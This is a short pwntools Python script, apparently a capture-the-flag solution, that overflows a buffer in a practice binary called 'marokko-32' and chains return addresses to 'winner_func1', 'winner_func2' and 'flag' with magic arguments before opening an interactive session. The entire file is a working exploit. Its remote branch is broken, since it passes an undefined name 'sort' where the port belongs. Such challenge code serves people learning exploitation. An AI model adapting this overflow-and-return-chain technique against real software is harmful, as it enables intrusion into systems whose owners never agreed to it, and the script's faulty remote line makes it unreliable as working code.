#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 8080

nombre_binario = "./marokko-32"
context.binary = nombre_binario
binario = context.binary  

if(args['REMOT']):
    s = remote(host, sort)
else:
    s = process(nombre_binario)

s.recvuntil("Your words: ")

offset = 28

payload = "A"*offset
payload += p32(binario.symbols['winner_func1'])
payload += p32(binario.symbols['winner_func2'])
payload += p32(binario.symbols['flag'])
payload += p32(0xBAAAAAAD)
payload += p32(0xDEADBAAD)

s.sendline(payload)
s.interactive()
